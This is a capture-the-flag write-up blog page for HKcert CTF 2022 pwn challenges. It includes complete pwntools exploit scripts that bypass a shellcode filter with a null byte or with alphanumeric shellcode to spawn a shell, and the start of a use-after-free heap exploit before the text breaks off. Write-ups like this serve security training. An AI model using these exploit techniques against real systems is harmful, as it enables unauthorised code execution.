<!DOCTYPE html>
<html class="" lang="en-us"><head>
    
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />

    <link
    rel="icon"
    href='/favicon.png'
/>
<link
    rel="shortcut icon"
    href='/favicon.ico'
    type="image/x-icon"
/>
<link
    rel="apple-touch-icon"
    href='/apple-touch-icon.png'
/>

    <link
        rel="icon"
        href='/logo.svg'
        type="image/svg+xml"
    />

<title>
        
            HKcert CTF 2022 Writeups  &ndash;
        
        Blogs
    </title>
    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
    
    
    <link type="text/css" rel="stylesheet" href=https://bott0n.github.io/css/styles.6f84514ad632600fba315252a38e35f30218f3d5ec268c1236f62782176917002e704c2b142a2d949bd831c6feabc3d6db35a3c6d6e151b839b9fe80cc19fa4f.css integrity="sha512-b4RRStYyYA&#43;6MVJSo4418wIY89XsJowSNvYnghdpFwAucEwrFCotlJvYMcb&#43;q8PW2zWjxtbhUbg5uf6AzBn6Tw==" />
<meta name="author" content="botton" />

    
        <meta name="keywords" content='ctf' />
    
    
        <meta name="description" content="" />
    

<meta property="og:site_name"
    content='Blogs' />

    <meta property="og:title" content="HKcert CTF 2022 Writeups" />
    <meta property="og:type" content="article" />
    
    <meta
        property="article:author" content="botton" />
    <meta
        property="article:published_time"
        content='2022-11-19T17:44:45Z&#43;0800' />
    
        
            <meta property="article:tag" content="ctf" />
        
    
    <meta property="og:url" content="https://bott0n.github.io/posts/hkcertctf-2022-writeups/" />
    <meta property="og:image"
        content='https://bott0n.github.io/icon512.png
    ' />
    
        <meta property="og:description" content="" />
    

<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:domain"
      content='bott0n.github.io'
/>
<meta property="twitter:url" content="https://bott0n.github.io/posts/hkcertctf-2022-writeups/" />


    <meta name="twitter:title" content="HKcert CTF 2022 Writeups" />
    
    <meta name="twitter:image"
        content='https://bott0n.github.io/icon512.png
    ' />
    
        <meta name="twitter:description" content="" />
    

<link rel="manifest" href="/manifest/index.json" />
</head>


<body>
        <div id="baseContainer"><header class="">
<div class="titleAndSearchContainer">
        <div id="titleContainer">
            
                <a class="unstyledLink" href="/">
                    <img src='/logo.svg' />
                </a>
            
            <div class="rightOfLogo">
                <div class="titleAndHamburger">
                    <h1>
                        <a class="unstyledLink" href="/">Blogs</a>
                        
                    </h1>
                    
                </div>
                <div id="wide_nav"><nav>
    
    <ul id="main-nav">
        <li><a href="/">Home</a></li>
        
            <li><a href="/posts">Posts</a></li>
        
        
        
        
        
        
            <li><a href="https://bott0n.github.io/about/aboutme/">About</a></li>
        
        
            <li><a href="/tags">Tags</a></li>
        
        
    </ul>
</nav>
</div>
            </div>
        </div>
        <div class="search">
    <input id="searchbar" type="text" placeholder='Search' />
    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
</div>
<script>
    function newSearch() {
        let term = searchbar.value.trim();
        if (!term) return;
        location.href = `/search?q=${term}`;
    }
    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
</script>

    </div>
    <div id="links">
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="/index.xml">
    
    
        &#xf09e;
    
    <span>
        RSS
    </span>
</a>

        
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://github.com/bott0n">
    
    
        &#xf09b;
    
    <span>
        GitHab
    </span>
</a>
<a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://twitter.com/botton3310">
    
    
        &#xf099;
    
    <span>
        Titter
    </span>
</a>

    </div>
    

</header>
<div id="contentContainer">
                <div id="content">
                    <main>
<article class="card single">
    
        <h1>HKcert CTF 2022 Writeups</h1>
    
    
        <p class="date">
            <span title='Date'> </span>
    2022-11-19

</p>
    
    
    
    <div class="articleToc">
    <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#shellcode_runner2">Shellcode_runner2</a>
          <ul>
            <li><a href="#unintended-solution">Unintended Solution</a>
              <ul>
                <li><a href="#locate-the-bug">Locate the bug</a></li>
                <li><a href="#solution">Solution</a></li>
                <li><a href="#full-exploit">Full exploit</a></li>
              </ul>
            </li>
            <li><a href="#intended-solution">Intended Solution</a>
              <ul>
                <li><a href="#search-for-similar-challenge">Search for similar challenge</a></li>
                <li><a href="#exploit-plan">Exploit plan</a></li>
                <li><a href="#full-exploit-1">Full exploit</a></li>
              </ul>
            </li>
          </ul>
        </li>
        <li><a href="#uaf2">UAF2</a>
          <ul>
            <li><a href="#vulnerability">Vulnerability</a></li>
            <li><a href="#exploit-plan-1">Exploit Plan</a></li>
            <li><a href="#full-exploit-2">Full exploit</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
    <hr />
</div>

    <div><h2 id="shellcode_runner2">Shellcode_runner2</h2>
<p>The challenge is named shellcode_runner. As the name said, this challenge is about to craft a shellcode to get a shell.</p>
<p>The source code is very short, create a <code>rwx</code> memory region at address <code>0x13370000</code>, we can input a payload with 100 max size and the program will execute the payload as assembly code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">shellcode <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>) mmap((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x13370000</span>, SIZE, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE<span style="color:#f92672">|</span>PROT_EXEC, MAP_ANONYMOUS<span style="color:#f92672">|</span>MAP_PRIVATE, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
</code></pre></div><p>Before executing, the program check the payload whether only include uppercase and digit nubmers.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">   <span style="color:#66d9ef">if</span> (is_all_upper(shellcode) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
        _abort(<span style="color:#e6db74">&#34;invalid shellcode!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    }
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">is_all_upper</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> s) {a
    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span>strlen(s); i<span style="color:#f92672">++</span>)
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>isupper(s[i]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>isdigit(s[i]) <span style="color:#f92672">&amp;&amp;</span> s[i] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39; &#39;</span>)
            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
}
</code></pre></div><p>We can see from the source code that, the binary doesn&rsquo;t limit the syscall, so our goal is clear, craft a shellcode and get the shell back.</p>
<h3 id="unintended-solution">Unintended Solution</h3>
<h4 id="locate-the-bug">Locate the bug</h4>
<p>The unintended solution is very simple, in the shellcode checking function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">is_all_upper</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> s) {a
    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span>strlen(s); i<span style="color:#f92672">++</span>)
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>isupper(s[i]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>isdigit(s[i]) <span style="color:#f92672">&amp;&amp;</span> s[i] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39; &#39;</span>)
            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
}
</code></pre></div><p><code>strlen</code> will stop at the first null byte of the string, so we can just padding the b'\x00' before the shellcode, then we are able to craft the shellcode without limitation.</p>
<h4 id="solution">Solution</h4>
<p>The plan is easy, use <code>shellcraft.sh()</code> to generate the getshell payload and padding the b'\x00' before the payload.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">sl(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> asm(shellcraft<span style="color:#f92672">.</span>sh()))
</code></pre></div><h4 id="full-exploit">Full exploit</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chal.hkcert22.pwnable.hk&#39;</span>
PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">28130</span>
context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span> <span style="color:#75715e"># i386/amd64</span>
context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>,<span style="color:#e6db74">&#39;splitw&#39;</span>,<span style="color:#e6db74">&#39;-h&#39;</span>]
elf <span style="color:#f92672">=</span> ELF(TARGET)

<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
    p <span style="color:#f92672">=</span> remote(HOST, PORT)
    <span style="color:#75715e"># libc = ELF(&#39;&#39;)</span>
<span style="color:#66d9ef">else</span>:
    p <span style="color:#f92672">=</span> process(TARGET)
    libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc
    gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;b *0x0000000000401b4b&#39;&#39;&#39;</span>
    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;gdb&#39;</span>:
       gdb<span style="color:#f92672">.</span>attach(p, gdbscript<span style="color:#f92672">=</span>gdbscript)

<span style="color:#75715e">#--- helper functions</span>
s       <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data               :p<span style="color:#f92672">.</span>send(data)
sa      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :p<span style="color:#f92672">.</span>sendafter(delim, data) 
sl      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data               :p<span style="color:#f92672">.</span>sendline(data) 
sla     <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :p<span style="color:#f92672">.</span>sendlineafter(delim, data) 
r       <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> numb<span style="color:#f92672">=</span><span style="color:#ae81ff">4096</span>          :p<span style="color:#f92672">.</span>recv(numb)
ru      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delims, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>  :p<span style="color:#f92672">.</span>recvuntil(delims, drop)
<span style="color:#75715e"># misc functions</span>
uu32    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data   :u32(data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
uu64    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data   :u64(data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
leak    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> name,addr :log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> = </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(name, addr))
<span style="color:#75715e">#---</span>

sl(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> asm(shellcraft<span style="color:#f92672">.</span>sh()))

p<span style="color:#f92672">.</span>interactive()

</code></pre></div><h3 id="intended-solution">Intended Solution</h3>
<p>After solving this chal, I am curious that this challenge shouldn&rsquo;t worth 300 score if the above bug exist.</p>
<p>Then, I asked the author and he said that was unintended solution.</p>
<p><img src="https://i.imgur.com/rz8VsIf.png" alt="">
<img src="https://i.imgur.com/yHgkm7v.png" alt=""></p>
<p>So, I decieded to solve this challenge with the intended solution - craft shellcode with only uppercase and digit number.</p>
<h4 id="search-for-similar-challenge">Search for similar challenge</h4>
<p>There is many type of similar shellcode challenge in various CTF such as alphanumeric shellcode, even number shellcode, odd number shellcode, etc&hellip;</p>
<p>After searching in the internet, I found a similar shellcode challenge that is more stricted than the current which is only allowed hex number in the shellcode.</p>
<p><a href="https://ctftime.org/writeup/34583">https://ctftime.org/writeup/34583</a></p>
<p>The solution of the above is to write shellcode that makes use of xors of known constant data values in order to builds a loader shellcode.</p>
<p>We can also use the same method to solve this challenge with the opcode table.
<a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=X64_alphanumeric_opcodes">https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=X64_alphanumeric_opcodes</a></p>
<h4 id="exploit-plan">Exploit plan</h4>
<p>The first idea is, this challenge didn&rsquo;t disallow any syscall, so we can try to craft a <code>read</code> syscall to bypass the limitation of byte instead of directly craft a <code>execve(&quot;/bin/sh&quot;, 0, 0)</code></p>
<p>The program has told us the various register value before running the shellcode</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">Before</span> <span style="color:#66d9ef">running</span> <span style="color:#66d9ef">the</span> <span style="color:#66d9ef">shellcode</span>:
<span style="color:#a6e22e">rax</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0x13370000</span>
<span style="color:#a6e22e">rbx</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0x7fff7afd0468</span>
<span style="color:#a6e22e">rcx</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0x40</span>
<span style="color:#a6e22e">rdx</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0x13370000</span>
<span style="color:#a6e22e">rbp</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0x7fff7afd0270</span>
<span style="color:#a6e22e">rsp</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0x7fff7afd01c0</span>
<span style="color:#a6e22e">rsi</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0x13370000</span>
<span style="color:#a6e22e">rdi</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0x40</span>
<span style="color:#a6e22e">r8</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0xffffffff</span>
<span style="color:#a6e22e">r9</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0x40</span>
<span style="color:#a6e22e">r10</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0x13370000</span>
<span style="color:#a6e22e">r11</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0x7fff7afd01c0</span>
<span style="color:#a6e22e">r12</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0x13370000</span>
<span style="color:#a6e22e">r13</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0x40</span>
</code></pre></div><p>To achieve the of <code>read</code> syscall, we need to control <code>rax</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code> and from the above register info, we know that we only need to prepare the value of <code>rax</code> and <code>rdi</code>.</p>
<p>We abused <code>xor al, $imm</code> and <code>xor [rdx + $offset], al</code> to craft <code>0f05</code> of syscall and <code>5f</code> of <code>pop rdi</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#a6e22e">Craft</span> <span style="color:#66d9ef">syscall</span>
<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0x44</span>
<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0x4b</span>
<span style="color:#a6e22e">xor</span> [<span style="color:#66d9ef">rdx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x42</span>], <span style="color:#66d9ef">al</span>
<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0x4e</span>
<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0x44</span>
<span style="color:#a6e22e">xor</span> [<span style="color:#66d9ef">rdx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x43</span>], <span style="color:#66d9ef">al</span>

<span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#a6e22e">Craft</span> <span style="color:#66d9ef">pop</span> <span style="color:#66d9ef">rdi</span>
<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0x5a</span>    
<span style="color:#66d9ef">xor</span> [<span style="color:#66d9ef">rdx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x41</span>], <span style="color:#66d9ef">al</span>
</code></pre></div><p>For the <code>rax</code>, we can use <code>pop rax</code> to get the <code>0</code> from stack memory.
After that, we use <code>push rax</code> to pass the <code>0</code> to stack to pass it to rdi by <code>pop rdi</code>.</p>
<p>Combine the plan together, we can have the <code>read(0, 0x00000013370000, 0x00000013370000)</code> call, then we just need to pass the payload from <code>shellcraft.sh()</code> with a few padding.</p>
<p>Finally, we get the shell!.</p>
<h4 id="full-exploit-1">Full exploit</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chal.hkcert22.pwnable.hk&#39;</span>
PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">28130</span>
context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span> <span style="color:#75715e"># i386/amd64</span>
context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>,<span style="color:#e6db74">&#39;splitw&#39;</span>,<span style="color:#e6db74">&#39;-h&#39;</span>]
elf <span style="color:#f92672">=</span> ELF(TARGET)

<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
    p <span style="color:#f92672">=</span> remote(HOST, PORT)
    <span style="color:#75715e"># libc = ELF(&#39;&#39;)</span>
<span style="color:#66d9ef">else</span>:
    p <span style="color:#f92672">=</span> process(TARGET)
    libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc
    gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;b *0x0000000000401b4b&#39;&#39;&#39;</span>
    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;gdb&#39;</span>:
       gdb<span style="color:#f92672">.</span>attach(p, gdbscript<span style="color:#f92672">=</span>gdbscript)

<span style="color:#75715e">#--- helper functions</span>
s       <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data               :p<span style="color:#f92672">.</span>send(data)
sa      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :p<span style="color:#f92672">.</span>sendafter(delim, data) 
sl      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data               :p<span style="color:#f92672">.</span>sendline(data) 
sla     <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :p<span style="color:#f92672">.</span>sendlineafter(delim, data) 
r       <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> numb<span style="color:#f92672">=</span><span style="color:#ae81ff">4096</span>          :p<span style="color:#f92672">.</span>recv(numb)
ru      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delims, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>  :p<span style="color:#f92672">.</span>recvuntil(delims, drop)
<span style="color:#75715e"># misc functions</span>
uu32    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data   :u32(data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
uu64    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data   :u64(data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
leak    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> name,addr :log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> = </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(name, addr))
<span style="color:#75715e">#---</span>

sc <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">// Craft syscall 
</span><span style="color:#e6db74">xor al, 0x44
</span><span style="color:#e6db74">xor al, 0x4b
</span><span style="color:#e6db74">xor [rdx + 0x42], al
</span><span style="color:#e6db74">xor al, 0x4e
</span><span style="color:#e6db74">xor al, 0x44
</span><span style="color:#e6db74">xor [rdx + 0x43], al
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">// Craft pop rdi
</span><span style="color:#e6db74">xor al, 0x5a    
</span><span style="color:#e6db74">xor [rdx + 0x41], al
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
<span style="color:#75715e"># pop rax to be 0</span>
sc <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#34;pop rax&#34;</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x29</span>
<span style="color:#75715e"># padding</span>
sc <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#34;push rax&#34;</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span>

<span style="color:#75715e"># sc = &#34;4D4K0BB4N4D0BC4Z0BAXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXPPPPP&#34;</span>
<span style="color:#75715e"># read(0, 0x00000013370000, 0x00000013370000)</span>
sla(<span style="color:#e6db74">&#34;Input your shellcode here (max: 100):&#34;</span>, sc)
input(<span style="color:#e6db74">&#34;getshell&#34;</span>)
sl(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x44</span> <span style="color:#f92672">+</span> asm(shellcraft<span style="color:#f92672">.</span>sh()))

p<span style="color:#f92672">.</span>interactive()

</code></pre></div><h2 id="uaf2">UAF2</h2>
<h3 id="vulnerability">Vulnerability</h3>
<p>The bug is in<code>remove_animal</code> function</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">free(zoo.animals[choice]<span style="color:#f92672">-&gt;</span>name);
free(zoo.animals[choice]);
</code></pre></div><p>There are not null the pointer after free, obivously this is a <code>UAF</code> bug.</p>
<h3 id="exploit-plan-1">Exploit Plan</h3>
<p>The idea to exploit is use <code>add_animal</code> function to create eight 0x18 size chunk and free it all. As the same size of tcache is only 7 slot, the remaining one will into fast-bins.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">add(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span>) <span style="color:#75715e"># 0</span>
add(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span>) <span style="color:#75715e"># 1</span>
add(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;C&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span>) <span style="color:#75715e"># 2</span>
add(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;D&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span>) <span style="color:#75715e"># 3</span>
remove(<span style="color:#ae81ff">0</span>)
remove(<span style="color:#ae81ff">1</span>)
remove(<span style="color:#ae81ff">2</span>)
remove(<span style="color:#ae81ff">3</span>)
</code></pre></div><p>Here is the heap bins:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  heap bins
──────────────────────────────────────── Tcachebins <span style="color:#66d9ef">for</span> thread <span style="color:#ae81ff">1</span> ────────────────────────────────────────
Tcachebins<span style="color:#f92672">[</span>idx<span style="color:#f92672">=</span>0, size<span style="color:#f92672">=</span>0x20<span style="color:#f92672">]</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">7</span>  ←  Chunk<span style="color:#f92672">(</span>addr<span style="color:#f92672">=</span>0xc77380, size<span style="color:#f92672">=</span>0x20, flags<span style="color:#f92672">=</span>PREV_INUSE<span style="color:#f92672">)</span>  ←  Chunk<span style="color:#f92672">(</span>addr<span style="color:#f92672">=</span>0xc77320, size<span style="color:#f92672">=</span>0x20, flags<span style="color:#f92672">=</span>PREV_INUSE<span style="color:#f92672">)</span>  ←  Chunk<span style="color:#f92672">(</span>addr<span style="color:#f92672">=</span>0xc77340, size<span style="color:#f92672">=</span>0x20, flags<span style="color:#f92672">=</span>PREV_INUSE<span style="color:#f92672">)</span>  ←  Chunk<span style="color:#f92672">(</span>addr<span style="color:#f92672">=</span>0xc772e0, size<span style="color:#f92672">=</span>0x20, flags<span style="color:#f92672">=</span>PREV_INUSE<span style="color:#f92672">)</span>  ←  Chunk<span style="color:#f92672">(</span>addr<span style="color:#f92672">=</span>0xc77300, size<span style="color:#f92672">=</span>0x20, flags<span style="color:#f92672">=</span>PREV_INUSE<span style="color:#f92672">)</span>  ←  Chunk<span style="color:#f92672">(</span>addr<span style="color:#f92672">=</span>0xc772a0, size<span style="color:#f92672">=</span>0x20, flags<span 